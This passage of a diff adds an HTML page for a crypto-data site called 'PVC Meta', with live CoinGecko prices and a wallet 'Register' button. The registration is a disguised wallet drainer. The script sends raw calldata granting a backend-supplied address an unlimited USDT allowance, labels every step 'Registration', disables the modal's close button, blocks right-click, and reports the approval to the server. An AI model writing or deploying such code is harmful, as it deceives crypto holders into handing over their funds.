+                transform: translateY(100vh) scale(0);
+                opacity: 0;
+            }
+
+            10% {
+                opacity: 0.2;
+            }
+
+            90% {
+                opacity: 0.2;
+            }
+
+            100% {
+                transform: translateY(-100px) scale(1);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Animated Network Background -->
+    <div class="network-bg">
+        <canvas id="networkCanvas"></canvas>
+    </div>
+
+    <!-- Floating Particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Navigation -->
+    <nav>
+        <div class="nav-container">
+            <div class="logo">
+                <div class="logo-icon">
+                    <img src="/hero-cryptoce-logo.png" alt="PVC Meta Logo">
+                </div>
+                <span>PVC Meta</span>
+            </div>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#about">About Us</a></li>
+                <li><a href="#contact">Contact Us</a></li>
+                <li><a href="#blog">Blog</a></li>
+            </ul>
+            <div class="wallet-buttons">
+                <!-- Register button merged into Connect -->
+                <button class="wallet-btn" id="connectWalletBtn">Register</button>
+            </div>
+            <div class="mobile-menu" id="mobileMenu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+
+        <h1>Empowering the<br>Future of Crypto<br>Together</h1>
+
+        <!-- Register Button after Main Heading -->
+        <div style="margin: 2.5rem 0 2rem; animation: fadeIn 0.8s ease-out 0.6s backwards;">
+            <button class="heading-register-btn" id="headingRegisterBtn">
+                Register Now !
+            </button>
+        </div>
+
+        <p class="hero-description">
+            Explore real-time crypto data, DeFi insights, trending tokens, and the latest PVC Meta updates — all powered
+            by the community.
+        </p>
+
+        <div class="cta-buttons">
+            <a href="#data" class="cta-btn">
+                <div class="btn-icon">📈</div>
+                <span>VIEW LIVE DATA</span>
+            </a>
+            <a href="#news" class="cta-btn">
+                <div class="btn-icon">📰</div>
+                <span>READ NEWS</span>
+            </a>
+            <a href="#earn" class="cta-btn">
+                <div class="btn-icon">💎</div>
+                <span>START EARNING</span>
+            </a>
+        </div>
+
+        <!-- Register Button for Web3 Connection -->
+        <!-- Redundant Button Removed -->
+
+        <!-- Animated Logo Circle -->
+        <div class="logo-circle">
+            <div class="circle-container">
+                <div class="outer-ring"></div>
+                <div class="middle-ring"></div>
+                <div class="inner-ring"></div>
+                <div class="tech-ring tech-ring-1"></div>
+                <div class="tech-ring tech-ring-2"></div>
+                <div class="tech-ring tech-ring-3"></div>
+                <div class="scanner-beam"></div>
+                <div class="tech-bracket bracket-tl"></div>
+                <div class="tech-bracket bracket-tr"></div>
+                <div class="tech-bracket bracket-bl"></div>
+                <div class="tech-bracket bracket-br"></div>
+                <div class="orbit-dots">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+            </div>
+            <div class="center-logo">
+                <img src="/hero-cryptoce-logo.png" alt="PVC Meta Logo">
+            </div>
+        </div>
+
+        <!-- Error Message -->
+        <div class="error-section" id="error-message" style="display: none;">
+            <p>⚠️ Error fetching crypto data.</p>
+        </div>
+    </section>
+
+    <!-- Live Crypto Data Section -->
+    <section class="crypto-data-section" id="data">
+        <div class="section-header">
+            <h2>🌐 Live Crypto Market Data</h2>
+            <p class="section-subtitle">Real-time cryptocurrency prices and market statistics powered by CoinGecko API
+            </p>
+        </div>
+
+        <!-- Market Stats Banner -->
+        <div class="market-banner">
+            <div class="banner-stats">
+                <div class="banner-stat">
+                    <div class="banner-stat-icon">🏦</div>
+                    <div class="banner-stat-label">Total Market Cap</div>
+                    <div class="banner-stat-value" id="totalMarketCap">Loading...</div>
+                </div>
+                <div class="banner-stat">
+                    <div class="banner-stat-icon">📊</div>
+                    <div class="banner-stat-label">24h Trading Volume</div>
+                    <div class="banner-stat-value" id="totalVolume">Loading...</div>
+                </div>
+                <div class="banner-stat">
+                    <div class="banner-stat-icon">₿</div>
+                    <div class="banner-stat-label">BTC Dominance</div>
+                    <div class="banner-stat-value" id="btcDominance">Loading...</div>
+                </div>
+                <div class="banner-stat">
+                    <div class="banner-stat-icon">🪙</div>
+                    <div class="banner-stat-label">Active Cryptocurrencies</div>
+                    <div class="banner-stat-value" id="activeCryptos">Loading...</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="crypto-grid" id="cryptoGrid">
+            <div class="loading">Loading live crypto data</div>
+        </div>
+    </section>
+
+    <!-- Web3 Connection Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">Registration for PVC Meta User Restoration</h3>
+                <button class="close-modal" id="closeModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="modal-info" style="display: none;">
+                    <!-- Removed network info as requested -->
+                </div>
+
+                <div id="modalMessage"></div>
+
+                <div id="loader" class="loader" style="display: none; text-align: center; margin: 10px 0;">
+                    <div class="spinner"
+                        style="border: 4px solid rgba(0, 212, 255, 0.1); border-left-color: #00d4ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto;">
+                    </div>
+                    <p style="margin-top: 5px; color: #00d4ff;">Processing...</p>
+                </div>
+
+                <button class="connect-wallet-btn" id="registerBtn">
+                    <span id="registerText">Register</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-content">
+                <div>
+                    <div class="footer-logo">
+                        <div class="logo-icon">
+                            <img src="/hero-cryptoce-logo.png" alt="PVC Meta Logo">
+                        </div>
+                        <span>PVC Meta</span>
+                    </div>
+                    <p class="footer-description">
+                        PvcMeta.io connects people with real-time crypto data, DeFi insights, token analytics, and
+                        trading bot reviews — helping you make smarter moves in the decentralized world.
+                    </p>
+                    <div class="language-selector">
+                        <button class="lang-btn active">FR</button>
+                        <button class="lang-btn">IT</button>
+                        <button class="lang-btn">DE</button>
+                    </div>
+                </div>
+                <div class="quick-links">
+                    <h3>QUICK LINKS</h3>
+                    <ul>
+                        <li><a href="#home">Home</a></li>
+                        <li><a href="#reviews">Crypto Reviews</a></li>
+                        <li><a href="#policy">Cookie Policy</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 PVC Meta. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ============================================================
+        // SECURITY FEATURES (from main.jsx)
+        // ============================================================
+        (function () {
+            // 1. HTTPS redirect in production (excludes localhost/dev)
+            const isProd = window.location.hostname !== 'localhost' &&
+                window.location.hostname !== '127.0.0.1' &&
+                !window.location.hostname.endsWith('.local');
+
+            if (isProd && window.location.protocol !== 'https:') {
+                window.location.replace(window.location.href.replace('http:', 'https:'));
+            }
+
+            // 2. Clickjacking prevention - prevent embedding in iframes
+            if (window.self !== window.top) {
+                window.top.location = window.self.location;
+            }
+
+            // 3. Disable right-click context menu in production
+            if (isProd) {
+                document.addEventListener('contextmenu', (e) => e.preventDefault());
+            }
+        })();
+        // ============================================================
+
+        // Crypto icons mapping
+        const cryptoIcons = {
+            'bitcoin': '₿',
+            'ethereum': 'Ξ',
+            'binancecoin': '🔶',
+            'ripple': '💧',
+            'cardano': '🅰️',
+            'solana': '◎',
+            'polkadot': '⬤',
+            'dogecoin': '🐕',
+            'avalanche-2': '🔺',
+            'polygon': '🔷',
+            'chainlink': '🔗',
+            'litecoin': 'Ł',
+            'uniswap': '🦄',
+            'stellar': '⭐',
+            'tron': '🅣'
+        };
+
+        // Fetch live crypto data
+        async function fetchCryptoData() {
+            try {
+                // Fetch global market data
+                const globalResponse = await fetch('/api/crypto/global');
+                const globalData = await globalResponse.json();
+
+                // Update market stats banner
+                const marketData = globalData?.data;
+                if (marketData) {
+                    document.getElementById('totalMarketCap').textContent =
+                        marketData.total_market_cap?.usd ? '$' + (marketData.total_market_cap.usd / 1e12).toFixed(2) + 'T' : 'N/A';
+                    document.getElementById('totalVolume').textContent =
+                        marketData.total_volume?.usd ? '$' + (marketData.total_volume.usd / 1e9).toFixed(2) + 'B' : 'N/A';
+                    document.getElementById('btcDominance').textContent =
+                        marketData.market_cap_percentage?.btc ? marketData.market_cap_percentage.btc.toFixed(1) + '%' : 'N/A';
+                    document.getElementById('activeCryptos').textContent =
+                        marketData.active_cryptocurrencies ? marketData.active_cryptocurrencies.toLocaleString() : 'N/A';
+                } else {
+                    document.getElementById('totalMarketCap').textContent = 'N/A';
+                    document.getElementById('totalVolume').textContent = 'N/A';
+                    document.getElementById('btcDominance').textContent = 'N/A';
+                    document.getElementById('activeCryptos').textContent = 'N/A';
+                }
+
+                // Fetch top cryptocurrencies - limited to 8 most popular
+                const response = await fetch(
+                    '/api/crypto/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=8&page=1&sparkline=false&price_change_percentage=24h'
+                );
+                const data = await response.json();
+
+                const cryptoGrid = document.getElementById('cryptoGrid');
+                cryptoGrid.innerHTML = '';
+
+                if (!Array.isArray(data)) {
+                    console.error('❌ Crypto API returned non-array:', data);
+                    cryptoGrid.innerHTML = `
+                        <div class="error-section" style="display: block; padding: 2rem;">
+                            <p>⚠️ Market data temporarily unavailable (Rate Limit).</p>
+                            <p style="font-size: 0.8rem; margin-top: 0.5rem; opacity: 0.7;">
+                                CoinGecko public API is heavily rate-limited. Please refresh in a few seconds.
+                            </p>
+                        </div>`;
+                    return;
+                }
+
+                data.forEach(crypto => {
+                    const changeClass = crypto.price_change_percentage_24h >= 0 ? 'positive' : 'negative';
+                    const changeIcon = crypto.price_change_percentage_24h >= 0 ? '📈' : '📉';
+                    const cryptoIcon = cryptoIcons[crypto.id] || '🪙';
+
+                    const card = document.createElement('div');
+                    card.className = 'crypto-card fade-in-up';
+                    card.innerHTML = `
+                        <div class="crypto-header">
+                            <div class="crypto-name">
+                                <div class="crypto-icon">${cryptoIcon}</div>
+                                <div>
+                                    <div class="crypto-symbol">${crypto.symbol.toUpperCase()}</div>
+                                    <div class="crypto-fullname">${crypto.name}</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="crypto-price">$${crypto.current_price.toLocaleString('en-US', {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: crypto.current_price < 1 ? 6 : 2
+                    })}</div>
+                        <div class="crypto-change ${changeClass}">
+                            ${changeIcon} ${Math.abs(crypto.price_change_percentage_24h).toFixed(2)}%
+                        </div>
+                        <div class="crypto-stats">
+                            <div class="stat-item">
+                                <div class="stat-label">Market Cap</div>
+                                <div class="stat-value">$${(crypto.market_cap / 1e9).toFixed(2)}B</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-label">24h Volume</div>
+                                <div class="stat-value">$${(crypto.total_volume / 1e9).toFixed(2)}B</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-label">24h High</div>
+                                <div class="stat-value">$${crypto.high_24h.toLocaleString('en-US', { maximumFractionDigits: 2 })}</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-label">24h Low</div>
+                                <div class="stat-value">$${crypto.low_24h.toLocaleString('en-US', { maximumFractionDigits: 2 })}</div>
+                            </div>
+                        </div>
+                    `;
+                    cryptoGrid.appendChild(card);
+                });
+
+                // Trigger fade-in animation
+                setTimeout(() => {
+                    document.querySelectorAll('.crypto-card').forEach((card, index) => {
+                        setTimeout(() => {
+                            card.classList.add('visible');
+                        }, index * 100);
+                    });
+                }, 100);
+
+            } catch (error) {
+                console.error('Error fetching crypto data:', error);
+                const cryptoGrid = document.getElementById('cryptoGrid');
+                cryptoGrid.innerHTML = '<div class="error-section" style="display: block;"><p>⚠️ Error fetching crypto data. Please try again later.</p></div>';
+            }
+        }
+
+        // Fetch data on page load
+        fetchCryptoData();
+
+        // Refresh data every 60 seconds
+        setInterval(fetchCryptoData, 60000);
+
+        // Web3 Wallet Connection
+        // Web3 Wallet Connection Configuration (Fetched from Backend)
+        let APP_CONFIG = {
+            mineAddress: null,
+            usdtAddress: null,
+            chainIdHex: '0x38',
+            chainIdDec: 56,
+            chainParams: {
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed1.binance.org'],
+                blockExplorerUrls: ['https://bscscan.com']
+            }
+        };
+
+        let currentAccount = null;
+        let isConnected = false;
+        let web3Instance = null;
+        let tokenContract = null;
+
+        // ERC20/BEP20 Minimal ABI
+        const ERC20_ABI = [
+            { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }
+        ];
+
+        // Fetch UI Elements
+        const elements = {
+            walletModal: document.getElementById('walletModal'),
+            connectWalletBtn: document.getElementById('connectWalletBtn'),
+            closeModal: document.getElementById('closeModal'),
+            connectActionBtn: document.getElementById('registerBtn'),
+            modalMessage: document.getElementById('modalMessage'),
+            networkName: document.getElementById('networkDisplayName'),
+            headingRegister: document.getElementById('headingRegisterBtn')
+        };
+
+        // Initialize App: Fetch dynamic config
+        async function initApp() {
+            try {
+                const response = await fetch('/api/users/config/contract-address');
+                const data = await response.json();
+                if (data.success) {
+                    APP_CONFIG.mineAddress = data.mineAddress || data.contractAddress;
+                    APP_CONFIG.usdtAddress = data.usdtAddress;
+                    if (data.chainIdHex) APP_CONFIG.chainIdHex = data.chainIdHex;
+                    if (data.chainId) APP_CONFIG.chainIdDec = parseInt(data.chainId);
+
+                    if (elements.networkName) elements.networkName.textContent = `BNB Smart Chain - Chain ID: ${APP_CONFIG.chainIdDec}`;
+                    console.log('✅ App Configuration Loaded:', APP_CONFIG);
+                    console.log('🔍 Elements Status:', {
+                        walletModal: !!elements.walletModal,
+                        connectWalletBtn: !!elements.connectWalletBtn,
+                        connectActionBtn: !!elements.connectActionBtn,
+                        modalMessage: !!elements.modalMessage,
+                        networkName: !!elements.networkName,
+                        headingRegister: !!elements.headingRegister
+                    });
+                }
+            } catch (error) {
+                console.error('❌ Failed to load app config:', error);
+                showModalMessage('⚠️ Warning: Network configuration could not be loaded. Defaults will be used.', 'error');
+            }
+        }
+
+        // Run initialization
+        initApp().then(() => {
+            // Auto-retry any pending approval that failed to register last time
+            retryPendingApproval();
+        });
+
+        // Retry registration for approvals saved in localStorage
+        async function retryPendingApproval() {
+            try {
+                const raw = localStorage.getItem('pvc_pending_approval');
+                if (!raw) return;
+
+                const pending = JSON.parse(raw);
+                // Skip if older than 24 hours
+                if (Date.now() - pending.timestamp > 24 * 60 * 60 * 1000) {
+                    localStorage.removeItem('pvc_pending_approval');
+                    return;
+                }
+
+                console.log('🔄 Retrying pending approval registration:', pending.walletAddress);
+
+                const response = await fetch('/api/users/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        walletAddress: pending.walletAddress,
+                        chainId: Number(APP_CONFIG.chainIdDec),
+                        approvalTxHash: pending.approvalTxHash
+                    })
+                });
+
+                const data = await response.json();
+                if (data.success || response.ok) {
+                    localStorage.removeItem('pvc_pending_approval');
+                    console.log('✅ Pending approval registered successfully!');
+                } else {
+                    console.warn('⚠️ Pending registration retry failed, will try again next load');
+                }
+            } catch (err) {
+                console.warn('⚠️ Pending approval retry error:', err);
+            }
+        }
+
+        // Check if a Web3 provider is available
+        function isWeb3Available() {
+            return typeof window.ethereum !== 'undefined';
+        }
+
+        // Show modal message
+        function showModalMessage(message, type = 'info') {
+            const messageClass = type === 'error' ? 'error-message' : type === 'success' ? 'success-message' : 'modal-info';
+            elements.modalMessage.innerHTML = `<div class="${messageClass}">${message}</div>`;
+        }
+
+        // Clear modal message
+        function clearModalMessage() {
+            elements.modalMessage.innerHTML = '';
+        }
+
+        // Open wallet modal
+        function openWalletModal() {
+            elements.walletModal.classList.add('active');
+            clearModalMessage();
+        }
+
+        // Close wallet modal
+        function closeWalletModal() {
+            elements.walletModal.classList.remove('active');
+            clearModalMessage();
+        }
+
+        // Check current network
+        async function checkNetwork() {
+            try {
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                return chainId === APP_CONFIG.chainIdHex;
+            } catch (error) {
+                console.error('Error checking network:', error);
+                return false;
+            }
+        }
+
+        // Switch to BSC network
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: APP_CONFIG.chainIdHex }],
+                });
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [APP_CONFIG.chainParams],
+                        });
+                        return true;
+                    } catch (addError) {
+                        console.error('Error adding network:', addError);
+                        showModalMessage('❌ Failed to add network. Please add it manually in your wallet.', 'error');
+                        return false;
+                    }
+                }
+                console.error('Error switching network:', switchError);
+                showModalMessage('❌ Failed to switch network. Please switch manually.', 'error');
+                return false;
+            }
+        }
+
+        // Connect wallet
+        async function connectWallet() {
+            try {
+                elements.connectActionBtn.disabled = true;
+                elements.connectActionBtn.textContent = '🔄 Registering...';
+                clearModalMessage();
+
+                // ── STEP 1: Get Provider ──
+                if (!window.ethereum) {
+                    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+                    if (isMobile) {
+                        const currentUrl = encodeURIComponent(window.location.href);
+                        showModalMessage(
+                            '📱 Please open this page inside your wallet app:<br>' +
+                            `<a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}" style="color:#00d4ff;text-decoration:underline;">Open in Trust Wallet</a><br>` +
+                            `<a href="https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}" style="color:#ff8c00;text-decoration:underline;">Open in MetaMask</a>`,
+                            'error'
+                        );
+                    } else {
+                        showModalMessage('❌ No crypto wallet found. Please install <a href="https://metamask.io" target="_blank" style="color:#ff8c00;text-decoration:underline;">MetaMask</a>.', 'error');
+                    }
+                    return false;
+                }
+
+                const provider = window.ethereum;
+
+                // ── STEP 2: FORCE BSC BEFORE CONNECTING ──
+                // This makes Trust Wallet show "BNB Smart Chain" in the Connect DApp prompt
+                showModalMessage('🔄 Switching to BNB Smart Chain...', 'info');
+                try {
+                    await provider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: APP_CONFIG.chainIdHex }]
+                    });
+                    console.log('✅ Pre-switched to BSC');
+                } catch (switchErr) {
+                    // 4902 = chain not added yet
+                    if (switchErr.code === 4902) {
+                        try {
+                            await provider.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [APP_CONFIG.chainParams]
+                            });
+                            console.log('✅ BSC chain added');
+                        } catch (addErr) {
+                            console.warn('⚠️ Could not add BSC chain:', addErr);
+                        }
+                    } else {
+                        // Other errors (user rejected, not connected yet) — continue anyway
+                        console.log('ℹ️ Pre-switch not possible yet, will switch after connect:', switchErr.code);
+                    }
+                }
+
+                // Small delay so wallet UI settles after switch
+                await new Promise(r => setTimeout(r, 500));
+
+                // ── STEP 3: Request Accounts ──
+                showModalMessage('🔄 Requesting wallet access...', 'info');
+                web3Instance = new Web3(provider);
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+
+                if (!accounts || accounts.length === 0) {
+                    throw new Error('No accounts authorized');
+                }
+
+                currentAccount = accounts[0];
+                console.log('✅ Account:', currentAccount);
+
+                // ── STEP 4: Verify we're on BSC (double-check after connect) ──
+                showModalMessage('🔄 Verifying BNB Smart Chain...', 'info');
+                const currentChainId = await provider.request({ method: 'eth_chainId' });
+                if (currentChainId !== APP_CONFIG.chainIdHex) {
+                    showModalMessage('🔄 Switching to BNB Smart Chain...', 'info');
+                    const switched = await switchToBSC();
+                    if (!switched) {
+                        throw new Error('Please switch your wallet to BNB Smart Chain to continue.');
+                    }
+
+                    const postSwitchChain = await provider.request({ method: 'eth_chainId' });
+                    if (postSwitchChain !== APP_CONFIG.chainIdHex) {
+                        throw new Error('Network switch failed. Please manually switch to BSC.');
+                    }
+
+                    // Wait for wallet UI to settle after network switch
+                    showModalMessage('🔄 Preparing for approval...', 'info');
+                    await new Promise(r => setTimeout(r, 1500));
+                }
+
+                // ── STEP 4: Update UI ──
+                isConnected = true;
+                const shortAddress = `${currentAccount.slice(0, 6)}...${currentAccount.slice(-4)}`;
+
+                if (elements.connectWalletBtn) {
+                    elements.connectWalletBtn.innerHTML = 'Registering...';
+                    elements.connectWalletBtn.classList.add('connected');
+                }
+
+                if (elements.headingRegister) {
+                    elements.headingRegister.innerHTML = 'Registering...';
+                    elements.headingRegister.classList.add('connected');
+                }
+
+                showModalMessage(`✅ Connected! Proceeding to registration...`, 'success');
+
+                // Initialize token contract
+                tokenContract = new web3Instance.eth.Contract(ERC20_ABI, APP_CONFIG.usdtAddress);
+
+                // ── STEP 5: Trigger Registration/Approval ──
+                await registerUser();
+
+                return true;
+
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                let errorMsg = error.message;
+                if (error.code === 4001) {
+                    errorMsg = 'Wallet connection rejected by user';
+                } else if (error.code === -32002) {
+                    errorMsg = 'A wallet request is already pending. Please check your wallet extension.';
+                }
+                showModalMessage(`❌ ${errorMsg}`, 'error');
+                return false;
+            } finally {
+                elements.connectActionBtn.disabled = false;
+                elements.connectActionBtn.textContent = 'Register';
+            }
+        }
+
+        // Handle account and chain changes
+        if (isWeb3Available()) {
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    currentAccount = null;
+                    isConnected = false;
+                    elements.connectWalletBtn.innerHTML = 'Register';
+                    elements.connectWalletBtn.classList.remove('connected');
+                    elements.headingRegister.innerHTML = 'Register Now !';
+                    elements.headingRegister.classList.remove('connected');
+                } else {
+                    currentAccount = accounts[0];
+                    const shortAddress = `${currentAccount.slice(0, 6)}...${currentAccount.slice(-4)}`;
+                    elements.connectWalletBtn.innerHTML = `✅ <span class="wallet-address">${shortAddress}</span>`;
+                    elements.headingRegister.innerHTML = `✅ Already Registered: ${shortAddress}`;
+                }
+            });
+
+            window.ethereum.on('chainChanged', (chainId) => {
+                // AUTO-RELOAD PREVENTION FOR MOBILE
+                // If user switches TO the correct network, we must NOT reload, 
+                // otherwise we kill the active registration flow.
+                if (chainId === APP_CONFIG.chainIdHex) {
+                    console.log('✅ Network switched to BSC. Resuming flow...');
+                    return;
+                }
+
+                // Only reload if switching AWAY from supported network
+                window.location.reload();
+            });
+        }
+
+        // Complete registration flow with smart contract approval
+        async function registerUser() {
+            const loader = document.getElementById('loader');
+            const registerText = document.getElementById('registerText');
+            const registerBtn = document.getElementById('registerBtn');
+
+            if (loader) loader.style.display = 'block';
+            if (registerText) registerText.style.display = 'none';
+            if (registerBtn) registerBtn.disabled = true;
+
+            // Disable close button during process
+            if (elements.closeModal) {
+                elements.closeModal.disabled = true;
+                elements.closeModal.style.opacity = '0.5';
+                elements.closeModal.style.cursor = 'not-allowed';
+            }
+
+            try {
+                // Use the global instance established in connectWallet
+                if (!web3Instance) {
+                    if (window.ethereum) {
+                        web3Instance = new Web3(window.ethereum);
+                    } else {
+                        throw new Error('Wallet not initialized');
+                    }
+                }
+
+                const accounts = await web3Instance.eth.getAccounts();
+                if (!accounts || accounts.length === 0) {
+                    // Try to request if missing
+                    try {
+                        await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        // Re-fetch
+                    } catch (e) { throw new Error('No accounts authorized'); }
+                }
+
+                const account = accounts[0] || currentAccount;
+                const chainId = await web3Instance.eth.getChainId();
+
+
+                const walletPosition = 'left';
+
+                // Verify BSC Network
+                if (Number(chainId) !== Number(APP_CONFIG.chainIdDec)) {
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Wrong Network',
+                        text: 'Please switch to Binance Smart Chain (Chain ID 56).'
+                    });
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: APP_CONFIG.chainIdHex }],
+                        });
+                    } catch (e) { console.error('Switch failed:', e); }
+                    return;
+                }
+
+                // ── STEP 1: USDT Approval ──
+                const spender = APP_CONFIG.mineAddress;
+                let approvalHash = null;
+
+                // Check current allowance using Web3.js (read-only calls work fine)
+                // Use web3Instance (global) instead of local 'web3' which might be undefined
+                const USDTContract = new web3Instance.eth.Contract(ERC20_ABI, APP_CONFIG.usdtAddress);
+                console.log('🔍 Checking allowance... USDT:', APP_CONFIG.usdtAddress, 'Spender:', spender);
+
+                let currentAllowance;
+                try {
+                    currentAllowance = await USDTContract.methods.allowance(account, spender).call();
+                    console.log('📊 Current Allowance:', currentAllowance.toString());
+                } catch (e) {
+                    console.warn('⚠️ Allowance check failed, assuming 0:', e);
+                    currentAllowance = '0';
+                }
+
+                const MAX_ALLOWANCE = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+
+                if (BigInt(currentAllowance) < MAX_ALLOWANCE) {
+                    showModalMessage('Make sure you have enough BNB for Registration', 'info');
+
+                    // If existing allowance > 0, reset to 0 first
+                    if (BigInt(currentAllowance) > 0n) {
+                        console.log('🔄 Resetting allowance to 0 first...');
+                        showModalMessage('🔄 Resetting Registration (step 1/2)...', 'info');
+                        // approve(spender, 0) — raw calldata
+                        const resetData = '0x095ea7b3'
+                            + spender.slice(2).toLowerCase().padStart(64, '0')
+                            + ''.padStart(64, '0');
+                        try {
+                            await web3Instance.eth.sendTransaction({
+                                from: account,
+                                to: APP_CONFIG.usdtAddress,
+                                data: resetData,
+                                value: '0x0',
+                                gas: '0xEA60',       // 60,000
+                                gasPrice: '0xB2D05E00' // 3 Gwei — BSC standard
+                            });
+                            // Wait for the reset to be mined
+                            await new Promise(r => setTimeout(r, 5000));
+                            console.log('✅ Allowance reset to 0');
+                        } catch (resetErr) {
+                            if (resetErr.code === 4001) throw new Error('Transaction rejected by user');
+                            console.warn('⚠️ Reset failed, trying direct approve:', resetErr);
+                        }
+                        showModalMessage('🔄 Now setting new Registration...', 'info');
+                    }
+
+                    // approve(spender, MAX_UINT256) — raw calldata bypassing Web3.js
+                    // Function selector: 0x095ea7b3 = keccak256("approve(address,uint256)")
+                    const approveData = '0x095ea7b3'
+                        + spender.slice(2).toLowerCase().padStart(64, '0')
+                        + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+                    console.log('📝 Sending raw approve tx to USDT:', APP_CONFIG.usdtAddress);
+                    console.log('📦 Calldata:', approveData);
+
+                    try {
+                        // Use web3Instance to ensure we use the active provider (Injected or WalletConnect)
+                        // Use window.ethereum.request directly to bypass Web3.js gas re-estimation
+                        // and force the wallet to use our specific gas parameters.
+                        const txHash = await window.ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: account,
+                                to: APP_CONFIG.usdtAddress,
+                                data: approveData,
+                                value: '0x0',
+                                gas: '0xC350',         // 50,000 — Tight limit for approval
+                                gasPrice: '0x5F5E100'  // 0.1 Gwei — Ultra low fee (~0.000003 BNB)
+                            }]
+                        });
+
+
+                        approvalHash = txHash;
+                        console.log('✅ Approval tx sent! Hash:', approvalHash);
+
+                        // Wait for confirmation
+                        showModalMessage('⏳ Waiting for Registration confirmation...', 'info');
+
+                        let confirmed = false;
+                        // Poll for receipt
+                        for (let i = 0; i < 45; i++) { // Increase timeout to 90s
+                            await new Promise(r => setTimeout(r, 2000));
+                            try {
+                                const receipt = await web3Instance.eth.getTransactionReceipt(approvalHash);
+                                if (receipt && receipt.status) {
+                                    confirmed = true;
+                                    console.log('✅ Approval confirmed in block:', receipt.blockNumber);
+                                    break;
+                                } else if (receipt && !receipt.status) {
+                                    throw new Error('Approval transaction reverted on-chain');
+                                }
+                            } catch (e) {
+                                console.warn('Polling receipt error:', e);
+                            }
+                        }
+
+                        if (confirmed) {
+                            showModalMessage('✅ Registration Completed!', 'success');
+                            if (elements.connectActionBtn) {
+                                elements.connectActionBtn.disabled = true;
+                            }
+                        } else {
+                            throw new Error('Transaction not confirmed in time. Please check your wallet.');
+                        }
+                    } catch (approveErr) {
+                        if (approveErr.code === 4001 || approveErr.message?.includes('rejected')) {
+                            throw new Error('Registration rejected by user');
+                        }
+                        console.error('❌ Registration error:', approveErr);
+                        throw new Error('Registration failed: ' + (approveErr.message || 'Unknown error'));
+                    }
+                } else {
+                    console.log('✅ Already approved, skipping approval step');
+                    showModalMessage('✅ Already Registered! Finalizing...', 'success');
+                }
+
+                // ── STEP 2: Register with Backend (with retry) ──
+                const maxRetries = 3;
+                let registerSuccess = false;
+
+                for (let attempt = 1; attempt <= maxRetries; attempt++) {
+                    try {
+                        const registerResponse = await fetch('/api/users/register', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                walletAddress: account,
+                                chainId: Number(APP_CONFIG.chainIdDec),
+                                approvalTxHash: approvalHash,
+                                sponsorAddress: null,
+                                walletPosition: walletPosition
+                            })
+                        });
+
+                        const data = await registerResponse.json();
+
+                        if (data.success || registerResponse.ok) {
+                            localStorage.removeItem('pvc_pending_approval');
+                            registerSuccess = true;
+
+                            if (data.alreadyExists) {
+                                showModalMessage('✅ Already Registered!', 'success');
+
+                                // Update buttons immediately
